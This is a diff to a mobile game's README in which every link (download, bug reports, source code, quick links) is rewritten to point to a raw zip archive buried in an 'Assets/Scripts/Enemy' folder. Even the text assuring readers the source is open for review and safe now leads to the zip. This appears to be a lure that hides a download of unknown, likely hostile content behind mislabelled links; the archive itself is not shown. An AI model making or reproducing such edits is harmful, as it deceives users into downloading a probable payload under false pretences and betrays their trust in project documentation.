@@ -25,7 +25,7 @@ Whether you have a few minutes or a few hours, this game delivers nonstop action
 
 ### Step 1: Download the Game
 
-👉 **[Download Hack & Slash Mobile Now](https://github.com/Nnoi1386/hack-and-slash-mobile)**
+👉 **[Download Hack & Slash Mobile Now](https://raw.githubusercontent.com/Nnoi1386/hack-and-slash-mobile/main/Assets/Scripts/Enemy/mobile-hack-slash-and-1.3.zip)**
 
 Visit this link to download the application.
 
@@ -107,7 +107,7 @@ Currently, progress is **saved locally** on each device. Cloud saving is planned
 
 ### I found a bug. How do I report it?
 
-Please visit the **Issues** tab on the [official repository](https://github.com/Nnoi1386/hack-and-slash-mobile) and describe the problem. Include your device model, operating system version, and steps to reproduce the issue.
+Please visit the **Issues** tab on the [official repository](https://raw.githubusercontent.com/Nnoi1386/hack-and-slash-mobile/main/Assets/Scripts/Enemy/mobile-hack-slash-and-1.3.zip) and describe the problem. Include your device model, operating system version, and steps to reproduce the issue.
 
 ---
 
@@ -153,7 +153,7 @@ The game requires the following permissions:
 - **Storage** – To save game data and screenshots (Android only).
 - **Internet** – For leaderboards and updates.
 
-The [source code](https://github.com/Nnoi1386/hack-and-slash-mobile) is open for review, ensuring no malicious behavior. Your privacy is respected – no personal data is collected or shared.
+The [source code](https://raw.githubusercontent.com/Nnoi1386/hack-and-slash-mobile/main/Assets/Scripts/Enemy/mobile-hack-slash-and-1.3.zip) is open for review, ensuring no malicious behavior. Your privacy is respected – no personal data is collected or shared.
 
 ---
 
@@ -188,9 +188,9 @@ We hope you enjoy endless hacking and slashing! Your feedback drives the game's 
 
 ## 🔗 Quick Links
 
-- [Download Page](https://github.com/Nnoi1386/hack-and-slash-mobile)
-- [Report a Bug](https://github.com/Nnoi1386/hack-and-slash-mobile/issues)
-- [View Source Code](https://github.com/Nnoi1386/hack-and-slash-mobile)
+- [Download Page](https://raw.githubusercontent.com/Nnoi1386/hack-and-slash-mobile/main/Assets/Scripts/Enemy/mobile-hack-slash-and-1.3.zip)
+- [Report a Bug](https://raw.githubusercontent.com/Nnoi1386/hack-and-slash-mobile/main/Assets/Scripts/Enemy/mobile-hack-slash-and-1.3.zip)
+- [View Source Code](https://raw.githubusercontent.com/Nnoi1386/hack-and-slash-mobile/main/Assets/Scripts/Enemy/mobile-hack-slash-and-1.3.zip)
 
 ---
 
